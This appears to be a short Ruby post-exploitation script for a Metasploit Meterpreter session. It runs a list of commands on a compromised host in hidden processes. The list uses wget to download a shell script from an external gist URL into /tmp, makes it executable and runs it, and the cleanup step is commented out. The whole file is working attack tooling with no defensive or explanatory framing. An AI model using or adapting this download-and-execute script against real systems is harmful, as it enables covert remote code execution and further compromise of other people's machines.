def inject(session, cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
        begin
            print_status "running command #{cmd}"
            r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
            while(d = r.channel.read)
                print_status("#{d}")
            end
            r.channel.close
            r.close
        rescue ::Exception => e
            print_error("Error Running Command #{cmd}: #{e.class} #{e}")
        end
    end
end

command_list = [
    "id",
    "wget https://gist.githubusercontent.com/Naramsim/05e770c3c0c07e54a35876f78ade98f3/raw -O /tmp/inject.sh",
    "chmod +x /tmp/inject.sh",
    "sh /tmp/inject.sh"#,
    #"rm /tmp/inject.sh"
]

inject(client, command_list)